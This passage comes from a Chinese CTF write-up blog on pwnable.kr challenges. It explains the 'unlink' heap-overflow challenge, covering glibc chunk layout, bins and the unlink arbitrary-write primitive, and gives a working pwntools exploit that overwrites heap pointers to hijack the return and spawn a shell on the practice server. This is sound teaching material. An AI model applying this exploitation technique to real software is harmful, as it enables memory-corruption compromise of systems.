class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C	形成这样一个链</span></span><br><span class="line">	A-&gt;fd = B;</span><br><span class="line">	B-&gt;bk = A;</span><br><span class="line">	B-&gt;fd = C;</span><br><span class="line">	C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;here is stack address leak: %p\n&quot;</span>, &amp;A);	<span class="comment">//A变量的栈地址</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;here is heap address leak: %p\n&quot;</span>, A);	<span class="comment">//A变量的堆地址</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;now that you have leaks, get shell!\n&quot;</span>);</span><br><span class="line">	<span class="comment">// heap overflow!</span></span><br><span class="line">	gets(A-&gt;buf);	<span class="comment">//输入到A对象的buf数组中，该数组为8字节大小</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// exploit this unlink!</span></span><br><span class="line">	unlink(B);	<span class="comment">//将B传入</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个OBJ数据结构基本就是个双链表，删除节点的操作很熟悉了，就是修改要删除节点的前后节点的指针。这道题主要考查的的是基本的<strong>堆溢出漏洞unlink利用</strong>，那个unlink函数是对早期的一个叫<code>ptmalloc</code>函数的模拟。下面先来学习一下Linux堆的管理以及unlink操作的含义，这里面牵扯的知识比我想象的深多了......:(</p>
<h3 id="漏洞原理-1">漏洞原理</h3>
<p>unlink是一种操作，从刚才题目模拟的unlink操作函数也看出来了，实质是将双链表中的结点摘下来。这种操作一般发生在进行free操作之后，内存中相邻的后面的堆块(小地址)或前面的堆块(高地址)是空闲的，那么就会发生<strong>堆的合并操作</strong>。合并之后的更大的堆块会插入到<code>unsorted bin</code>链表中。</p>
<p>这里有一个概念，unlink操作适用于大的块，小的块使用的是fastbin(小于80字节)。前者是一个双链表，后者是一个单链表。这个漏洞可以实现向任意内存写入数据，下面进行分析。</p>
<p>首先给出Linux中的堆块结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">	INTERNAL_SIZE_T prev_size;<span class="comment">//前一个堆块大小(堆是低地址向高地址生长的，前一个堆块就是它下面的那一块)</span></span><br><span class="line">	INTERNAL_SIZE_T size;	<span class="comment">//堆块大小</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">fd</span>;</span>	<span class="comment">//前向指针</span></span><br><span class="line">	Struct malloc_chunk *bk;	<span class="comment">//后向指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>画一个图的话就是这样的：</p>
<p><img src="/img/入坑Pwn-刷题补坑/2eb47c85f5a863a5c2904e529c0409a6.png" style="zoom: 50%;" /></p>
<blockquote>
<p>在C中动态分配内存，使用的是malloc。其在GNU
C(glibc)中的实现则是基于dlmalloc的ptmalloc。ptmalloc的基本思路是将堆上的内存区域划分为多个chunk，在分配/回收内存时，对chunk进行分割、回收等操作。</p>
</blockquote>
<p>其中我们把<code>prev_size</code>和<code>size</code>叫做<strong>chunk
头</strong>，<strong>如果当前块的其前一个块未被使用</strong>(即空闲状态)，那么<code>prev_size</code>代表当前堆块的前一个堆块的大小。<code>size</code>代表当前块的大小，因为chunk的大小是8的整数倍，所以转换为二进制后，最后三位数字都是0，那么可以利用<strong>这三位来做标识位</strong>，只需要记住最低的那一位就可以了(即上图中的p)，该位代表前一个堆块是否被使用，空闲为0，非空闲为1。关于mem区域，这里记住，<strong>当前堆块未使用时，fd指向前一个空闲的堆块；bk指向后一个空闲的堆块。</strong></p>
<p>那么<code>prev_size</code>和<code>size</code>存在的意义是什么呢？答案是，你可以使用当前chunkj的地址减去<code>prev_size</code>的值，得到前一chunk的地址；使用当前chunk地址加上<code>size</code>的值，得到后一chunk的地址。</p>
<p>因为只有未使用的堆块其fd，bk才有意义，所以这些空闲的堆块就形成了一个空闲堆块的双链表，用于内存的分配和回收，这些链表被称为<code>bins</code>(bin原意为箱子)。</p>
<blockquote>
<p>一般来说，每个bin链表中的chunk都有相同或将近的大小。根据bin所包含chunk的大小，可以将bin分为fastbin,
unsorted bin, small bin, large bin。</p>
</blockquote>
<p>回到unlink的话题，当使用free释放一个堆块时，glibc会先判断<strong>向前合并</strong>，即这个块的前面有没有空闲的块，如果没有，放弃前向合并，再来判断<strong>向后合并</strong>，如果后面有空闲块的话就会向后合并，对当前块使用unlink操作。所以只要我们修改这个空闲块的指针，就可以实现任意读写了。下面回到题目进行分析。</p>
<p>根据大佬博客的提示，在main函数里有这么一个利用点：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200223205115065.png" /></p>
<p><code>retn</code>指令本质上是<code>pop eip</code>，流程来源是esp寄存器的值，而esp被[ecx-4]控制，ecx又被[ebp+var_4]控制，又因为<code>leave</code>指令相当于<code>mov esp, ebp, pop ebp</code>，对数据来源无影响。所以只要我们修改了ebp的值，就可以控制最终返回的地址了：构造<code>ecx-4</code>的地址为shell函数的起始地址：<code>0x080484EB</code>，我们可以先把这个地址写到一个内存地址中(比如输入的A-&gt;buf)，然后ecx指向该地址+4就可以了。</p>
<p>A-&gt;buf大小为8字节，所以shell地址等于<code>A+8</code>。而<code>ebp-4 == ecx == shell地址 + 4</code>，<code>ebp-4</code>的值等于stack_leak+0x10，所以假设内存布局是这样的，最终修改结果为第二行：</p>
<table>
<colgroup>
<col style="width: 5%" />
<col style="width: 5%" />
<col style="width: 12%" />
<col style="width: 10%" />
<col style="width: 10%" />
<col style="width: 10%" />
<col style="width: 21%" />
<col style="width: 24%" />
</colgroup>
<thead>
<tr class="header">
<th>A1</th>
<th>A2</th>
<th>A3</th>
<th>A4</th>
<th>B1</th>
<th>B2</th>
<th>B3</th>
<th>B4</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>A1</td>
<td>A2</td>
<td>shell地址</td>
<td>padding</td>
<td>padding</td>
<td>padding</td>
<td>heak_leak + 0xc</td>
<td>stack_leak + 0x10</td>
</tr>
</tbody>
</table>
<p>最终的payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x080484eb</span>	<span class="comment"># IDA中获取</span></span><br><span class="line"></span><br><span class="line">s =  ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,</span><br><span class="line">         port=<span class="number">2222</span>,</span><br><span class="line">         user=<span class="string">&#x27;unlink&#x27;</span>,</span><br><span class="line">         password=<span class="string">&#x27;guest&#x27;</span></span><br><span class="line">        )</span><br><span class="line">p = s.process(<span class="string">&quot;./unlink&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;here is stack address leak: &quot;</span>)</span><br><span class="line">stack_addr = p.recv(<span class="number">10</span>)	<span class="comment"># 获取A数据栈地址</span></span><br><span class="line">stack_addr = <span class="built_in">int</span>(stack_addr,<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;here is heap address leak: &quot;</span>)</span><br><span class="line">heap_addr = p.recv(<span class="number">9</span>)	<span class="comment"># 获得A堆块地址</span></span><br><span class="line">heap_addr = <span class="built_in">int</span>(heap_addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(shell_addr)</span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">12</span>	<span class="comment"># 三个padding填充</span></span><br><span class="line">payload += p32(stack_addr + <span class="number">12</span>)</span><br><span class="line">payload += p32(heap_addr + <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200223214409163.png" alt="image-20200223214409163" style="zoom:80%;" /></p>
<p>说实话堆溢出的难度要大一点，要求对内存布局、堆内存分配特点等等很熟悉，这里我还是不太清楚，打算专门写一篇博客来记录学习堆溢出的知识。</p>
<h3 id="参考学习-1">参考学习</h3>
<ul>
<li>https://www.cnblogs.com/clover-toeic/p/3853132.html</li>
<li>https://www.cnblogs.com/p4nda/p/7162378.html</li>
<li>https://blog.csdn.net/qq_25201379/article/details/81545128</li>
<li>https://www.cnblogs.com/alisecurity/p/5486458.html</li>
<li>https://wiki.x10sec.org/pwn/heap/unlink/</li>
<li>《C和C++安全编码》</li>
</ul>
<h2 id="blukat-待补充">blukat (待补充)</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Sometimes, pwnable is strange...</span><br><span class="line">hint: if this challenge is hard, you are a skilled player.</span><br><span class="line"></span><br><span class="line">ssh blukat@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure>
<h2 id="horcruxes待补充">horcruxes(待补充)</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Voldemort concealed his splitted soul inside 7 horcruxes.</span><br><span class="line">Find all horcruxes, and ROP it!</span><br><span class="line">author: jiwon choi</span><br><span class="line"></span><br><span class="line">ssh horcruxes@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
<p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>

    </article>
    <!-- license -->
    
        <div class="license-wrapper">
            <p>原文作者：<a href="https://lzwgiter.github.io">f10@t</a>
            <p>原文链接：<a href="https://lzwgiter.github.io/posts/bc7cb7a1.html">https://lzwgiter.github.io/posts/bc7cb7a1.html</a>
            <p>发表日期：<a href="https://lzwgiter.github.io/posts/bc7cb7a1.html">February 21st 2020, 2:38:37 pm</a>
            <p>更新日期：<a href="https://lzwgiter.github.io/posts/bc7cb7a1.html">October 29th 2023, 3:21:16 pm</a>
            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href="/posts/1ccc94ff.html" title="内存布局与栈溢出&堆溢出原理">
                    <div class="nextTitle">内存布局与栈溢出&堆溢出原理</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href="/posts/760e25d9.html" title="内存取证原理学习及Volatility - 篇二">
                    <div class="prevTitle">内存取证原理学习及Volatility - 篇二</div>
                </a>
            
        </li>
    </ul>
    <!-- comment -->
    
        <div class="post-comment">
            <!-- 来必力 City 版安装代码 -->


            

            

            

            <!-- utteranc评论 -->


            <!-- partial('_partial/comment/changyan') -->
            <!--PC版-->


            
            
    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
    <div id="comment"></div>
    <script>
        new Valine({
            el: '#comment',
            notify:false,
            verify:false,
            appId: "KADRlHg5xXyhKL0d6USDWfIB-gzGzoHsz",
            appKey: "Ppj8kIdro2yDqXOvqWkTRxuW",
            placeholder: "递茶就坐(　o=^•ェ•)o　┏━┓",
            path:window.location.pathname,
            avatar:'mm'
        });
    </script>


            

        </div>
    
    <!-- timeliness note -->
    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
    
    <!-- Mathjax -->
    
</main>

                <!-- profile -->
                
            </div>
            <footer class="footer footer-unloaded">
    <!-- social  -->
    
        <div class="social">
            
    
        
    
        
            
                <a href="//github.com/lzwgiter" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
            
        
    


        </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- website approve for Chinese user -->
    
    <!-- 不蒜子  -->
    
        <div class="busuanzi-container">
            
            
                <span id="busuanzi_container_site_uv">做客的小伙伴数: <span id="busuanzi_value_site_uv"></span></span>
            
        </div>
    	
</footer>

        </div>
        <!-- toc -->
        
            <div class="toc-wrapper toc-wrapper-loding" style=







    top:50vh;

>
                <div class="toc-catalog">
                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                </div>
                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">序言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwnable.kr%E4%B9%A0%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">Pwnable.kr习题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fd"><span class="toc-number">2.1.</span> <span class="toc-text">fd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#collision"><span class="toc-number">2.2.</span> <span class="toc-text">collision</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bof"><span class="toc-number">2.3.</span> <span class="toc-text">bof</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">2.4.</span> <span class="toc-text">flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#passcode"><span class="toc-number">2.5.</span> <span class="toc-text">passcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#random"><span class="toc-number">2.6.</span> <span class="toc-text">random</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#input"><span class="toc-number">2.7.</span> <span class="toc-text">input</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#leg"><span class="toc-number">2.8.</span> <span class="toc-text">leg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mistake"><span class="toc-number">2.9.</span> <span class="toc-text">mistake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellshock"><span class="toc-number">2.10.</span> <span class="toc-text">shellshock</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#coin1"><span class="toc-number">2.11.</span> <span class="toc-text">coin1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blackjack"><span class="toc-number">2.12.</span> <span class="toc-text">blackjack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lotto"><span class="toc-number">2.13.</span> <span class="toc-text">lotto</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd1"><span class="toc-number">2.14.</span> <span class="toc-text">cmd1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd2"><span class="toc-number">2.15.</span> <span class="toc-text">cmd2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uaf"><span class="toc-number">2.16.</span> <span class="toc-text">uaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.16.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0"><span class="toc-number">2.16.2.</span> <span class="toc-text">参考学习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memcpy"><span class="toc-number">2.17.</span> <span class="toc-text">memcpy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#asm"><span class="toc-number">2.18.</span> <span class="toc-text">asm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unlink"><span class="toc-number">2.19.</span> <span class="toc-text">unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.19.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0-1"><span class="toc-number">2.19.2.</span> <span class="toc-text">参考学习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blukat-%E5%BE%85%E8%A1%A5%E5%85%85"><span class="toc-number">2.20.</span> <span class="toc-text">blukat (待补充)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#horcruxes%E5%BE%85%E8%A1%A5%E5%85%85"><span class="toc-number">2.21.</span> <span class="toc-text">horcruxes(待补充)</span></a></li></ol></li></ol>
            </div>
        
        <!-- sidebar -->
        <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
        <div class="sidebar-panel-archives">
    <!-- 在 ejs 中将 archive 按照时间排序 -->
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 96
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
        
            
            
            <div class="archive-year"> 2023 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">10/22</span>
            <a class="archive-post-title" href="/posts/33ea2108.html">Spring AOP再探</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">10/09</span>
            <a class="archive-post-title" href="/posts/c41813ec.html">重新审视微服务</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">10/04</span>
            <a class="archive-post-title" href="/posts/85bf5302.html">K8s攻防之OWASP-K8S-TOP10（下）</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">09/16</span>
            <a class="archive-post-title" href="/posts/8aa36aba.html">K8s攻防之OWASP-K8S-TOP10（上）</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/08</span>
            <a class="archive-post-title" href="/posts/c16d1cd9.html">Java内存马原理（一）</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/08</span>
            <a class="archive-post-title" href="/posts/e2947908.html">Java Instrument机制及管窥IAST</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/03</span>
            <a class="archive-post-title" href="/posts/479daa6d.html">gRPC简介与使用</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/30</span>
            <a class="archive-post-title" href="/posts/b74b8800.html">fastjson反序列化漏洞学习（二）</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/07</span>
            <a class="archive-post-title" href="/posts/73d00ee7.html">Netty框架学习</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/04</span>
            <a class="archive-post-title" href="/posts/d6b305b7.html">Java网络编程模型复习</a>
        </li>
    
        
            
            
                
                </ul>
            
            <div class="archive-year"> 2022 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/26</span>
            <a class="archive-post-title" href="/posts/203767b8.html">python-Numpy库使用</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/20</span>
            <a class="archive-post-title" href="/posts/f06096b.html">MATLAB - Wireless Communication Onramp</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">01/19</span>
            <a class="archive-post-title" href="/posts/3041f265.html">Matlab编程基础</a>
        </li>
    
        
            
            
                
                </ul>
            
            <div class="archive-year"> 2021 </div>
            <ul class="year-list">
            
        
        <li class="archive-post-item">
            <span class="archive-post-date">10/04</span>
            <a class="archive-post-title" href="/posts/169c63d0.html">Bloom Filter概念原理</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/25</span>
            <a class="archive-post-title" href="/posts/85e98ef0.html">zk-SNARKs简洁的非交互式零知识证明学习(一)</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/22</span>
            <a class="archive-post-title" href="/posts/a8e0eb2d.html">Quarkus学习（一）概述以及编写REST服务</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/19</span>
            <a class="archive-post-title" href="/posts/e88577c0.html">Cloud Programming Simplified:A Berkeley View on Serverless Computing</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/18</span>
            <a class="archive-post-title" href="/posts/99665dc1.html">闲聊一下Java中的DI和CDI</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/12</span>
            <a class="archive-post-title" href="/posts/ed901271.html">Kubernetes-集群环境搭建使用及问题记录（三）</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/09</span>
            <a class="archive-post-title" href="/posts/a08eb123.html">Kubernetes-集群环境搭建使用及问题记录（二）</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">08/03</span>
            <a class="archive-post-title" href="/posts/eed4a979.html">Kubernetes 集群环境搭建使用及问题记录（一）</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/24</span>
            <a class="archive-post-title" href="/posts/2f0b60dd.html">闲聊一下Go语言的函数方法和多态机制特点</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/14</span>
            <a class="archive-post-title" href="/posts/5893facf.html">express学习（一）-基于NodeJS的Web框架</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/10</span>
            <a class="archive-post-title" href="/posts/8a9b0b34.html">Beego学习-ORM</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/06</span>
            <a class="archive-post-title" href="/posts/84db08d3.html">Beego学习-路由设置</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">07/06</span>
            <a class="archive-post-title" href="/posts/a9031312.html">docker-compose及dockerfile总结</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">05/09</span>
            <a class="archive-post-title" href="/posts/77d22b2a.html">Spring安全技术-Spring Security使用及总结（一）</a>
        </li>
    
        
        <li class="archive-post-item">
            <span class="archive-post-date">04/28</span>
            <a class="archive-post-title" href="/posts/5e9eec21.html">DevOps技术-简单了解与入门</a>
        </li>
    
        
        <li class="archive-post-item">
